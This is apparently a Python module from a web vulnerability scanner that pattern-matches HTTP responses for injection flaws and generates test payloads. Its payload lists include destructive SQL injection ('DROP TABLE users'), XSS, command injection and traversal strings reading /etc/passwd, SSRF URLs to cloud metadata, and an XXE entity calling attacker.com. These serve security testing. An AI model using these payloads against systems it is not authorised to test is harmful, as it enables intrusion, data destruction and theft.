"""
AresProbe AI Engine
Advanced AI-powered vulnerability analysis and payload generation
"""

import re
import json
import hashlib
import random
import string
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import requests
from bs4 import BeautifulSoup
import nltk
from nltk.corpus import words
from nltk.tokenize import word_tokenize
from nltk.stem import PorterStemmer

from .logger import Logger


class ThreatLevel(Enum):
    """Threat level classification"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class VulnerabilityPattern:
    """Pattern for vulnerability detection"""
    
    def __init__(self, name: str, pattern: str, threat_level: ThreatLevel, 
                 description: str = "", confidence: float = 0.0):
        self.name = name
        self.pattern = pattern
        self.threat_level = threat_level
        self.description = description
        self.confidence = confidence
        self.compiled_pattern = re.compile(pattern, re.IGNORECASE | re.MULTILINE)


@dataclass
class AIAnalysisResult:
    """Result of AI analysis"""
    vulnerability_type: str
    confidence: float
    threat_level: ThreatLevel
    description: str
    recommendations: List[str]
    payloads: List[str]
    false_positive_risk: float


class AIEngine:
    """
    Advanced AI engine for intelligent vulnerability analysis
    """
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.stemmer = PorterStemmer()
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.payload_templates = self._load_payload_templates()
        self.context_analyzer = ContextAnalyzer()
        self.payload_generator = PayloadGenerator()
        
        # Initialize NLTK resources
        try:
            nltk.data.find('tokenizers/punkt')
            nltk.data.find('corpora/words')
        except LookupError:
            self.logger.warning("[!] Downloading NLTK data...")
            nltk.download('punkt', quiet=True)
            nltk.download('words', quiet=True)
    
    def _load_vulnerability_patterns(self) -> List[VulnerabilityPattern]:
        """Load vulnerability detection patterns"""
        patterns = [
            # SQL Injection Patterns
            VulnerabilityPattern(
                "SQL_INJECTION_ERROR",
                r"(mysql_fetch_array\(\)|ORA-\d+|Microsoft.*ODBC.*SQL Server|PostgreSQL.*ERROR|Warning.*mysql_)",
                ThreatLevel.HIGH,
                "SQL error message detected",
                0.9
            ),
            VulnerabilityPattern(
                "SQL_INJECTION_SYNTAX",
                r"(union.*select|select.*from|insert.*into|update.*set|delete.*from)",
                ThreatLevel.MEDIUM,
                "SQL syntax pattern detected",
                0.7
            ),
            
            # XSS Patterns
            VulnerabilityPattern(
                "XSS_SCRIPT_TAG",
                r"<script[^>]*>.*?</script>",
                ThreatLevel.HIGH,
                "Script tag injection detected",
                0.8
            ),
            VulnerabilityPattern(
                "XSS_EVENT_HANDLER",
                r"on\w+\s*=\s*['\"][^'\"]*['\"]",
                ThreatLevel.MEDIUM,
                "Event handler injection detected",
                0.6
            ),
            VulnerabilityPattern(
                "XSS_JAVASCRIPT_URI",
                r"javascript:\s*[^'\"]*",
                ThreatLevel.HIGH,
                "JavaScript URI scheme detected",
                0.8
            ),
            
            # Directory Traversal Patterns
            VulnerabilityPattern(
                "DIRECTORY_TRAVERSAL",
                r"\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c",
                ThreatLevel.HIGH,
                "Directory traversal pattern detected",
                0.7
            ),
            VulnerabilityPattern(
                "FILE_INCLUSION",
                r"(etc/passwd|windows/system32|boot\.ini|win\.ini)",
                ThreatLevel.CRITICAL,
                "System file access attempt detected",
                0.9
            ),
            
            # Command Injection Patterns
            VulnerabilityPattern(
                "COMMAND_INJECTION",
                r"(;|\||&|`|\$\().*(ls|dir|whoami|id|cat|type|ping)",
                ThreatLevel.CRITICAL,
                "Command injection pattern detected",
                0.8
            ),
            
            # XXE Patterns
            VulnerabilityPattern(
                "XXE_DOCTYPE",
                r"<!DOCTYPE[^>]*>.*<!ENTITY[^>]*>",
                ThreatLevel.HIGH,
                "XXE DOCTYPE declaration detected",
                0.7
            ),
            
            # SSRF Patterns
            VulnerabilityPattern(
                "SSRF_INTERNAL_IP",
                r"(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0)",
                ThreatLevel.HIGH,
                "Internal IP address access attempt",
                0.6
            )
        ]
        return patterns
    
    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for different vulnerability types"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' OR 1=1 LIMIT 1 OFFSET 0--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>"
            ],
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "& id",
                "` cat /etc/passwd `",
                "$(whoami)"
            ],
            "xxe": [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
            ],
            "ssrf": [
                "http://127.0.0.1:22",
                "http://169.254.169.254/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:22"
            ]
        }
    
    def analyze_response(self, response_text: str, response_headers: Dict[str, str], 
                        url: str, method: str = "GET") -> List[AIAnalysisResult]:
        """Analyze HTTP response for potential vulnerabilities"""
        results = []
        
        try:
            # Context analysis
            context = self.context_analyzer.analyze_context(response_text, response_headers, url, method)
            
            # Pattern matching
            for pattern in self.vulnerability_patterns:
                matches = pattern.compiled_pattern.findall(response_text)
                if matches:
                    confidence = self._calculate_confidence(pattern, matches, context)
                    
                    if confidence > 0.5:  # Threshold for reporting
                        result = AIAnalysisResult(
                            vulnerability_type=pattern.name,
                            confidence=confidence,
                            threat_level=pattern.threat_level,
                            description=pattern.description,
                            recommendations=self._generate_recommendations(pattern.name, context),
                            payloads=self._generate_payloads(pattern.name, context),
                            false_positive_risk=self._calculate_false_positive_risk(pattern, context)
                        )
                        results.append(result)
            
            # Advanced analysis
            advanced_results = self._advanced_analysis(response_text, context)
            results.extend(advanced_results)
            
        except Exception as e:
            self.logger.error(f"[-] Error in AI analysis: {e}")
        
        return results
    
    def generate_smart_payloads(self, vulnerability_type: str, context: Dict[str, Any], 
                               count: int = 5) -> List[str]:
        """Generate intelligent payloads based on context"""
        try:
            base_payloads = self.payload_templates.get(vulnerability_type, [])
            smart_payloads = []
            
            for base_payload in base_payloads[:count]:
                # Context-aware modifications
                modified_payload = self._adapt_payload_to_context(base_payload, context)
                smart_payloads.append(modified_payload)
            
            # Generate additional payloads based on context
            additional_payloads = self.payload_generator.generate_contextual_payloads(
                vulnerability_type, context, count
            )
            smart_payloads.extend(additional_payloads)
            
            return smart_payloads[:count]
            
        except Exception as e:
            self.logger.error(f"[-] Error generating smart payloads: {e}")
            return base_payloads[:count]
    
    def _calculate_confidence(self, pattern: VulnerabilityPattern, matches: List[str], 
                             context: Dict[str, Any]) -> float:
        """Calculate confidence score for a vulnerability pattern"""
        base_confidence = pattern.confidence
        
        # Adjust based on number of matches
        match_factor = min(len(matches) * 0.1, 0.3)
        
        # Adjust based on context
        context_factor = 0.0
        if context.get('has_parameters', False):
            context_factor += 0.2
        if context.get('is_form_submission', False):
            context_factor += 0.1
        if context.get('has_user_input', False):
            context_factor += 0.1
        
        # Adjust based on response characteristics
        response_factor = 0.0
        if context.get('response_length', 0) > 1000:
            response_factor += 0.1
        if context.get('has_error_indicators', False):
            response_factor += 0.2
        
        final_confidence = min(base_confidence + match_factor + context_factor + response_factor, 1.0)
        return final_confidence
    
    def _calculate_false_positive_risk(self, pattern: VulnerabilityPattern, 
                                      context: Dict[str, Any]) -> float:
        """Calculate risk of false positive"""
        risk = 0.0
        
        # Higher risk if pattern is common in legitimate content
        if pattern.name in ["SQL_INJECTION_SYNTAX", "XSS_EVENT_HANDLER"]:
            risk += 0.3
        
        # Lower risk if context suggests malicious intent
        if context.get('has_parameters', False):
            risk -= 0.1
        if context.get('is_form_submission', False):
            risk -= 0.1
        
        return max(0.0, min(1.0, risk))
    
    def _generate_recommendations(self, vulnerability_type: str, context: Dict[str, Any]) -> List[str]:
        """Generate security recommendations"""
        recommendations = {
            "SQL_INJECTION_ERROR": [
                "Implement parameterized queries or prepared statements",
                "Use input validation and sanitization",
                "Implement proper error handling without exposing database details",
                "Use a Web Application Firewall (WAF)"
            ],
            "XSS_SCRIPT_TAG": [
                "Implement Content Security Policy (CSP)",
                "Use output encoding/escaping for user input",
                "Validate and sanitize all user input",
                "Use HTTP-only cookies for sensitive data"
            ],
            "DIRECTORY_TRAVERSAL": [
                "Implement proper input validation",
                "Use whitelist-based file access",
                "Avoid user input in file paths",
                "Implement proper access controls"
            ],
            "COMMAND_INJECTION": [
                "Avoid executing system commands with user input",
                "Use parameterized command execution",
                "Implement proper input validation",
                "Use least privilege principles"
            ]
        }
        
        return recommendations.get(vulnerability_type, [
            "Implement proper input validation",
            "Use secure coding practices",
            "Regular security testing",
            "Keep software updated"
        ])
    
    def _generate_payloads(self, vulnerability_type: str, context: Dict[str, Any]) -> List[str]:
        """Generate payloads for testing"""
        return self.generate_smart_payloads(vulnerability_type, context, 3)
    
    def _adapt_payload_to_context(self, payload: str, context: Dict[str, Any]) -> str:
        """Adapt payload to specific context"""
        # Basic context adaptation
        if context.get('encoding_type') == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif context.get('encoding_type') == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        
        return payload
    
    def _advanced_analysis(self, response_text: str, context: Dict[str, Any]) -> List[AIAnalysisResult]:
        """Perform advanced AI analysis"""
        results = []
        
        try:
            # Analyze response structure
            soup = BeautifulSoup(response_text, 'html.parser')
            
            # Check for suspicious patterns
            suspicious_patterns = [
                (r"error.*sql|sql.*error", "SQL_ERROR_INDICATOR", ThreatLevel.MEDIUM),
                (r"warning.*mysql|mysql.*warning", "MYSQL_WARNING", ThreatLevel.MEDIUM),
                (r"exception.*database|database.*exception", "DB_EXCEPTION", ThreatLevel.HIGH),
                (r"access.*denied|permission.*denied", "ACCESS_DENIED", ThreatLevel.MEDIUM)
            ]
            
            for pattern, name, threat_level in suspicious_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    result = AIAnalysisResult(
                        vulnerability_type=name,
                        confidence=0.6,
                        threat_level=threat_level,
                        description=f"Suspicious pattern detected: {pattern}",
                        recommendations=["Investigate error handling", "Review logging practices"],
                        payloads=[],
                        false_positive_risk=0.4
                    )
                    results.append(result)
            
        except Exception as e:
            self.logger.error(f"[-] Error in advanced analysis: {e}")
        
        return results


class ContextAnalyzer:
    """Analyzes context for better vulnerability detection"""
    
    def analyze_context(self, response_text: str, response_headers: Dict[str, str], 
                       url: str, method: str) -> Dict[str, Any]:
        """Analyze the context of the response"""
        context = {
            'url': url,
            'method': method,
            'response_length': len(response_text),
            'has_parameters': '?' in url,
            'is_form_submission': method.upper() == 'POST',
            'has_user_input': self._detect_user_input(response_text),
            'has_error_indicators': self._detect_error_indicators(response_text),
            'content_type': response_headers.get('content-type', ''),
            'server': response_headers.get('server', ''),
            'encoding_type': self._detect_encoding_type(response_text)
        }
        
        return context
    
    def _detect_user_input(self, text: str) -> bool:
        """Detect if response contains user input"""
        user_input_patterns = [
            r"<input[^>]*value=['\"][^'\"]*['\"]",
            r"<textarea[^>]*>.*?</textarea>",
            r"selected.*option",
            r"checked.*input"
        ]
        
        for pattern in user_input_patterns:
            if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
                return True
        
        return False
    
    def _detect_error_indicators(self, text: str) -> bool:
        """Detect error indicators in response"""
        error_patterns = [
            r"error|exception|warning|fatal",
            r"stack trace|backtrace",
            r"debug.*info|debug.*mode"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        return False
    
    def _detect_encoding_type(self, text: str) -> str:
        """Detect the encoding type of the content"""
        if '<' in text and '>' in text:
            return 'html'
        elif text.startswith('{') or text.startswith('['):
            return 'json'
        elif '=' in text and '&' in text:
            return 'form'
        else:
            return 'text'


class PayloadGenerator:
    """Generates contextual payloads for testing"""
    
    def __init__(self):
        self.logger = Logger()
    
    def generate_contextual_payloads(self, vulnerability_type: str, context: Dict[str, Any], 
                                   count: int) -> List[str]:
        """Generate payloads based on context"""
        payloads = []
        
        try:
            if vulnerability_type == "SQL_INJECTION_ERROR":
                payloads.extend(self._generate_sql_payloads(context, count))
            elif vulnerability_type.startswith("XSS"):
                payloads.extend(self._generate_xss_payloads(context, count))
            elif vulnerability_type == "DIRECTORY_TRAVERSAL":
                payloads.extend(self._generate_traversal_payloads(context, count))
            
        except Exception as e:
            self.logger.error(f"[-] Error generating contextual payloads: {e}")
        
        return payloads[:count]
    
    def _generate_sql_payloads(self, context: Dict[str, Any], count: int) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = []
        
        # Basic payloads
        basic_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        # Context-aware payloads
        if context.get('has_parameters'):
            payloads.extend([
                "1' OR '1'='1",
                "1' UNION SELECT 1,2,3--",
                "1'; INSERT INTO logs VALUES ('test')--"
            ])
        
        payloads.extend(basic_payloads)
        return payloads[:count]
    
    def _generate_xss_payloads(self, context: Dict[str, Any], count: int) -> List[str]:
        """Generate XSS payloads"""
        payloads = []
        
        # Basic XSS payloads
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        # Context-aware payloads
        if context.get('encoding_type') == 'html':
            payloads.extend([
                "&lt;script&gt;alert('XSS')&lt;/script&gt;",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;"
            ])
        
        payloads.extend(basic_payloads)
        return payloads[:count]
    
    def _generate_traversal_payloads(self, context: Dict[str, Any], count: int) -> List[str]:
        """Generate directory traversal payloads"""
        payloads = []
        
        # Basic traversal payloads
        basic_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        # URL encoded payloads
        url_encoded = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32"
        ]
        
        payloads.extend(basic_payloads)
        payloads.extend(url_encoded)
        return payloads[:count]
